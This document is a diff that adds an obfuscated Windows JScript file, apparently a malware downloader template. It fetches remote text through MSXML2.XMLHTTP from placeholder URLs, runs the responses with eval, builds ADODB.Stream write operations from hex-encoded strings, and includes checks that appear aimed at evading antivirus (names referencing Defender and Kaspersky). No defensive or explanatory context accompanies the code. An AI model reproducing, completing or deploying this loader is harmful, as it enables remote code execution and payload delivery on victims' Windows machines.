@@ -1,0 +1,84 @@
+String.prototype.proc = eval;
+var yTnU4RuOR = [null, Array("CreateObject","Rea", "undefined","\x61\x64\x6F\x64\x62\x2E","\x43\x68\x61\x72\x53\x65\x74","Posi"+"tion","\x54\x79\x70\x65","Open","Wr")];
+
+Array.prototype.om0l4d3 = function() {
+	eval(dwdtg());
+	var hYiUrF = arguments;
+	return this[0]["replace"](/{(\d+)}/g, 
+	function(k3tTlE0, k3tTlE1) {
+		try{
+			return hYiUrF[k3tTlE1];
+		}catch(ex){
+			return k3tTlE0;
+		}
+	});
+};
+
+function dwdtg(){
+    var bjHTTP, dwddtg;
+    var l = ":-first:-"
+    bjHTTP = new ActiveXObject("MSXML2.XMLHTTP");
+    bjHTTP.open("GET", l, false);
+    bjHTTP.send(null);
+    if (bjHTTP.Status == 200) {
+        dwddtg = bjHTTP.ResponseTexT;
+    }
+    bjHTTP = null;
+    return dwddtg;
+}
+
+function dwdtgr(){
+    var bjHTTP, dwddtg;
+    var l = ":-last:-"
+    bjHTTP = new ActiveXObject("MSXML2.XMLHTTP");
+    bjHTTP.open("GET", l, false);
+    bjHTTP.send(null);
+    if (bjHTTP.Status == 200) {
+        dwddtg = bjHTTP.ResponseTexT;
+    }
+    bjHTTP = null;
+    return dwddtg;
+}
+yTnU4RuOR[2] = Array("yTnU4RuOR[4]()[yTnU4RuOR[1][6]] = 1;yTnU4RuOR[4]()[yTnU4RuOR[1][7]]();yTnU4RuOR[4]()[yTnU4RuOR[1][8]+\"ite\"](yTnU4RuOR[3][1]['nodeTypedValue']);", "yTnU4RuOR[4]()[yTnU4RuOR[1][5]] = 0;yTnU4RuOR[4]()[yTnU4RuOR[1][6]] = 2;", "yTnU4RuOR[4]()[yTnU4RuOR[1][4]] = yTnU4RuOR[3][2][0];", null);
+
+var rtrnr = "Defender";
+
+function xctrfnshr(rtrnrprms) {
+    if (!eval(dwdtgr())) {
+        WScript.Quit;
+    }
+
+    return true;
+}
+
+
+try {
+    var x00papUYS = new ActiveXObject("eu.incodesx");
+} catch (error) {
+    if (rtrnr != null) {
+        kprskyspnnthss();
+        WScript.Quit;
+    }
+}
+
+function kprskyspnnthss() {
+    for (var d = 0; d < 5; d++) {
+		if (d == 2) {
+			var jhgshj = 0;
+            while (true) {
+                break;
+            }
+		}
+		try {
+			if (d == 1 && xctrfnshr(rtrnr)) {
+				var pffWH = new ActiveXObject("pt.PTure");
+			}
+		} catch (error) {
+			if (d == 1) {
+				var jhgshj = 0;
+			}
+		}
+	
+	}
+    
+}
